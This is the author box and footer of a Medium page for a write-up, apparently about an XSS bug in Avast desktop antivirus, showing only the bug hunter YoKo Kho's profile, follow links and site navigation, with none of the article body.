[![YoKo Kho](https://miro.medium.com/v2/resize:fill:96:96/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/%40YoKoKho?source=post_page---post_author_info--1e99375f0968--------------------------------)[![YoKo Kho](https://miro.medium.com/v2/resize:fill:128:128/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/%40YoKoKho?source=post_page---post_author_info--1e99375f0968--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc340b945467d&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&user=YoKo+Kho&userId=c340b945467d&source=post_page-c340b945467d--post_author_info--1e99375f0968---------------------follow_profile-----------)[## Written by YoKo Kho](https://medium.com/%40YoKoKho?source=post_page---post_author_info--1e99375f0968--------------------------------)[1.2K Followers](https://medium.com/%40YoKoKho/followers?source=post_page---post_author_info--1e99375f0968--------------------------------)·[34 Following](https://medium.com/%40YoKoKho/following?source=post_page---post_author_info--1e99375f0968--------------------------------)

Independent | OSCP, CRTO, eWPTX, eCPTX | <https://twitter.com/YoKoAcc> | <https://bugcrowd.com/YokoKho> | <https://leanpub.com/bughunting101> (Bahasa) Free!

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc340b945467d&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&user=YoKo+Kho&userId=c340b945467d&source=post_page-c340b945467d--post_author_info--1e99375f0968---------------------follow_profile-----------)
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----1e99375f0968--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----1e99375f0968--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----1e99375f0968--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----1e99375f0968--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----1e99375f0968--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----1e99375f0968--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----1e99375f0968--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----1e99375f0968--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----1e99375f0968--------------------------------)[Teams](https://medium.com/business?source=post_page-----1e99375f0968--------------------------------)


